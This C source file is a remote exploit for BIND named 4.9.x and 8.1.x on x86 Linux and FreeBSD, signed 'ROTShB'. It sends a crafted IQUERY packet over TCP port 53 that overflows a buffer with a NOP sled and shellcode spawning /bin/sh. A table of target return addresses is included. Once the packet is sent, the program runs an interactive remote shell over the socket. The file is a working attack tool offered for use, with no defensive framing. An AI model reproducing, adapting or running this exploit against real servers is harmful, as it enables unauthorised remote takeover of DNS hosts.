/*
 * have fun.
 * -ROTShB
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>

#define DEFAULT_TARGET       0
#define DEFAULT_OPTIMIZATION 0
#define DEFAULT_ANBUF_OFFSET 300
#define DLEN_VAL             4
#define NPACKETSZ            512
#define NMAXDNAME            1025
#define PRE_EGG_DATALEN      (1+(sizeof(short)*3)+sizeof(long))
#define ALEN_VAL             (DLEN_VAL+PRE_EGG_DATALEN)
#define BUFFSIZE             4096

struct target_type
{
  char          desc[40];
  int           systype;
  unsigned long addr;
  unsigned long opt_addr;
  int           fd;
};

struct target_type target[] =
{
  {"x86 Linux 2.0.x named 4.9.5-REL (se)",0,0xbffff21c,0xbffff23c,4},
  {"x86 Linux 2.0.x named 4.9.5-REL (le)",0,0xbfffeedc,0xbfffeefc,4},
  {"x86 Linux 2.0.x named 4.9.5-P1 (se)",0,0xbffff294,0xbffff2cc,4},
  {"x86 Linux 2.0.x named 4.9.5-P1 (le)",0,0xbfffef8c,0xbfffefb4,4},
  {"x86 Linux 2.0.x named 4.9.6-REL (se)",0,0xbffff3e3,0xbffff403,4},
  {"x86 Linux 2.0.x named 4.9.6-REL (le)",0,0xbffff188,0xbffff194,4},
  {"x86 Linux 2.0.x named 8.1-REL (se)",0,0xbffff6a4,0xbffff6f8,5},
  {"x86 Linux 2.0.x named 8.1-REL (le)",0,0xbffff364,0xbffff3b8,5},
  {"x86 Linux 2.0.x named 8.1.1 (se)",0,0xbffff6b8,0xbffff708,5},
  {"x86 Linux 2.0.x named 8.1.1 (le)",0,0xbffff378,0xbffff3c8,5},
  {"x86 FreeBSD 3.x named 4.9.5-REL (se)",1,0xefbfd260,0xefbfd2c8,4},
  {"x86 FreeBSD 3.x named 4.9.5-REL (le)",1,0xefbfd140,0xefbfd1a8,4},
  {"x86 FreeBSD 3.x named 4.9.5-P1 (se)",1,0xefbfd260,0xefbfd2c8,4},
  {"x86 FreeBSD 3.x named 4.9.5-P1 (le)",1,0xefbfd140,0xefbfd1a8,4},
  {"x86 FreeBSD 3.x named 4.9.6-REL (se)",1,0xefbfd480,0xefbfd4e8,4},
  {"x86 FreeBSD 3.x named 4.9.6-REL (le)",1,0xefbfd218,0xefbfd274,4},
  {{0},0,0,0,0}
};

unsigned long resolve(char *host)

{
  long i;
  struct hostent *he;

  if((i=inet_addr(host))==(-1))
    if((he=gethostbyname(host))==NULL)
      return(0);
    else
      return(*(unsigned long *)he->h_addr);

  return(i);
}

int send_packet(int fd, char *buff, int len)
{
  char tmp[2], *ptr=tmp;

  PUTSHORT(len,ptr);

  if(write(fd,tmp,2)!=2)
    return(-1);

  if(write(fd,buff,len)!=len)
    return(-1);

  return(1);
}

int attack(int fd, struct target_type t, unsigned long offset, int optimized)
{
  char buff[BUFFSIZE], *ptr=buff;
  HEADER *dnsh=(HEADER *)buff;
  unsigned long i;
  int dlen, len=0;

  (void)memset(dnsh,0,sizeof(HEADER));

  dnsh->id      = htons(31337);
  dnsh->opcode  = IQUERY;
  dnsh->rd      = 1;
  dnsh->ra      = 1;
  dnsh->ancount = htons(1);

  ptr += sizeof(HEADER);
  len += sizeof(HEADER);

  *ptr = '\0';
  ptr++;

  i = T_A;
  PUTSHORT(i,ptr);

  i = C_IN;
  PUTSHORT(i,ptr);

  i = 31337;
  PUTLONG(i,ptr);

  if(t.systype==0)
    {
      char c0de[] =
        "\x31\xc0\xb0\x3f\x31\xdb\xb3\xff\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\xb1"
        "\x01\xcd\x80\x31\xc0\xb0\x3f\xb1\x02\xcd\x80\xeb\x24\x5e\x8d\x1e\x89"
        "\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10"
        "\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8\xd7"
        "\xff\xff\xff/bin/sh";

      if(optimized)
        dlen = NPACKETSZ+(NMAXDNAME+3)+8-PRE_EGG_DATALEN;
      else
        dlen = NPACKETSZ+(NMAXDNAME+3)+(sizeof(int)*6)+8-PRE_EGG_DATALEN;

      PUTSHORT(dlen,ptr);
      len += PRE_EGG_DATALEN;

      c0de[7] = t.fd;

      (void)memset(ptr,0x90,(sizeof(buff)-(ptr-buff)));

      i = NPACKETSZ-PRE_EGG_DATALEN-sizeof(c0de);
      (void)memcpy((ptr+i),c0de,sizeof(c0de));

      if(!optimized)
        {
          (void)memcpy((ptr+(dlen-16-sizeof(c0de))),c0de,sizeof(c0de));
          i = ALEN_VAL;
          (void)memcpy((ptr+(dlen-16)),&i,sizeof(i));
          i = DLEN_VAL;
          (void)memcpy((ptr+(dlen-12)),&i,sizeof(i));
        }
      else
        (void)memcpy((ptr+(dlen-4-sizeof(c0de))),c0de,sizeof(c0de));

      i = (optimized?t.opt_addr:t.addr)+offset;

      len += dlen;
    }


  else if(t.systype==1)
    {
      char c0de[] =
        "\xeb\x6e\x5e\xc6\x06\x9a\x31\xc9\x89\x4e\x01\xc6\x46\x05\x07\x88"
        "\x4e\x06\x51\x31\xdb\xb3\x04\x53\x66\xc7\x46\x07\xeb\xa7\x31\xc0"
        "\xb0\x5a\x50\xeb\x50\xfe\xc1\x51\x53\xc6\x46\x08\xb6\x31\xc0\xb0"
        "\x5a\x50\xeb\x41\xfe\xc1\x51\x53\xc6\x46\x08\xc5\x31\xc0\xb0\x5a"
        "\x50\xeb\x32\xc7\x46\x07\x2f\x62\x69\x6e\xc7\x46\x0b\x2f\x73\x68"
        "\x21\x31\xc0\x88\x46\x0e\x8d\x5e\x07\x89\x5e\x0f\x89\x46\x13\x8d"
        "\x5e\x13\x53\x8d\x5e\x0f\x53\x8d\x5e\x07\x53\xb0\x3b\x50\xeb\x05"
        "\xe8\x8d\xff\xff\xff";

      if(optimized)
        dlen = NPACKETSZ+(NMAXDNAME+3)+8-PRE_EGG_DATALEN;
      else
        dlen = NPACKETSZ+(NMAXDNAME+3)+(sizeof(int)*6)+8-PRE_EGG_DATALEN;

      PUTSHORT(dlen,ptr);
      len += PRE_EGG_DATALEN;

      c0de[22] = t.fd;

      (void)memset(ptr,0x90,(sizeof(buff)-(ptr-buff)));

      i = NPACKETSZ-PRE_EGG_DATALEN-sizeof(c0de);
      (void)memcpy((ptr+i),c0de,sizeof(c0de));

      if(!optimized)
        {
          (void)memcpy((ptr+(dlen-16-sizeof(c0de))),c0de,sizeof(c0de));
          i = ALEN_VAL;
          (void)memcpy((ptr+(dlen-16)),&i,sizeof(i));
          i = DLEN_VAL;
          (void)memcpy((ptr+(dlen-12)),&i,sizeof(i));
        }
      else
        (void)memcpy((ptr+(dlen-4-sizeof(c0de))),c0de,sizeof(c0de));

      i = (optimized?t.opt_addr:t.addr)+offset;
      (void)memcpy((ptr+(dlen-4)),&i,sizeof(i));

      len += dlen;
    }
  else
    return(0);

  return(send_packet(fd,buff,len));
}

int main(int argc, char *argv[])
{
  char xbuf[128], ybuf[128];
  unsigned long offset=DEFAULT_ANBUF_OFFSET;
  int ti, opt=DEFAULT_OPTIMIZATION, sock, i;
  int xlen=0, ylen=0;
  fd_set rd, wr;
  struct sockaddr_in sa;

  for(i=0;((target[i].addr)||(target[i].opt_addr));i++);

  if(argc<2)
    {
      (void)fprintf(stderr,"\ntarget types:\n");

      for(ti=0;ti<i;ti++)
        (void)fprintf(stderr," %-2d : %s\n",ti,target[ti].desc);

      (void)fprintf(stderr,"\nerror: usage: %s <host> [tt] [opt] [ofst]\n",
                    argv[0]);
      exit(-1);
    }

  if(argc>2)
    {
      ti = atoi(argv[2]);
      if((ti<0)||(ti>i))
        {
          (void)fprintf(stderr,"error: invalid target type %d\n",ti);
          exit(-1);
        }
    }
  else
    ti = DEFAULT_TARGET;

  if(argc>3)
    {
      opt = atoi(argv[3]);
      if((opt!=0)&&(opt!=1))
        {
          (void)fprintf(stderr,"error: invalid optimization setting %d\n",opt);
          exit(-1);
        }
    }

  if(argc>4)
    offset = atoi(argv[4]);


  if(!(sa.sin_addr.s_addr=resolve(argv[1])))
    {
      (void)fprintf(stderr,"error: can not resolve: %s\n",argv[1]);
      exit(-1);
    }

  sa.sin_family = AF_INET;
  sa.sin_port   = htons(53);

  if((sock=socket(sa.sin_family,SOCK_STREAM,0))==(-1))
    {
      (void)perror("error: socket");
      exit(-1);
    }

  if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))==(-1))
    {
      (void)perror("error: connect");
      exit(-1);
    }

  (void)printf("target             : %s\n",inet_ntoa(sa.sin_addr));
  (void)printf("target type        : %s\n",target[ti].desc);
  (void)printf("optimized named    : %s\n",(opt?"YES":"NO"));
  (void)printf("anbuff addr        : 0x%x\n",(unsigned int)
               (i=(opt?target[ti].opt_addr:target[ti].addr)));
  (void)printf("anbuff addr offset : %lu\n",offset);
  (void)printf("ret addr           : 0x%x\n",(unsigned int)(i+offset));
  (void)printf("fd to make dups of : %d\n",target[ti].fd);

  (void)printf("here we go...\n");

  switch(attack(sock,target[ti],offset,opt))
    {
    case -1:
      (void)perror("error: attack");
      exit(-1);
      break;

    case 0:
      (void)fprintf(stderr,"error: internal error\n");
      exit(-1);
      break;
    }

  (void)printf("have fun.\n");
  (void)printf("-ROTShB\n");

  while(1)
    {
      FD_ZERO(&rd);
      if(ylen<(sizeof(ybuf)-1))
        FD_SET(sock,&rd);
      if(xlen<(sizeof(xbuf)-1))
        FD_SET(fileno(stdin),&rd);

      FD_ZERO(&wr);
      if(xlen)
        FD_SET(sock,&wr);
      if(ylen)
        FD_SET(fileno(stdout),&wr);

      if((ti=select((sock+1),&rd,&wr,NULL,NULL))==(-1))
        {
          (void)perror("error: select");
          break;
        }

      if(FD_ISSET(fileno(stdin),&rd))
        {
          if((i=read(fileno(stdin),(xbuf+xlen),(sizeof(xbuf)-xlen)))==(-1))
            {
              (void)perror("error: read");
              exit(-1);
            }
          else if(i==0)
            break;

          xlen += i;
          if(!(--ti)) continue;
        }


      if(FD_ISSET(sock,&wr))
        {
          if(write(sock,xbuf,xlen)!=xlen)
            {
              (void)perror("error: write");
              exit(-1);
            }

          xlen = 0;
          if(!(--ti)) continue;
        }

      if(FD_ISSET(sock,&rd))
        {
          if((i=read(sock,(ybuf+ylen),(sizeof(ybuf)-ylen)))==(-1))
            {
              (void)perror("error: read");
              exit(-1);
            }
          else if(i==0)
            break;

          ylen += i;
          if(!(--ti)) continue;
        }

      if(FD_ISSET(fileno(stdout),&wr))
        {
          if(write(fileno(stdout),ybuf,ylen)!=ylen)
            {
              (void)perror("error: write");
              exit(-1);
            }

          ylen = 0;
          if(!(--ti)) continue;
        }
    }

  if(close(sock)==(-1))
    {
      (void)perror("error: close");
      exit(-1);
    }

  exit(0);
}
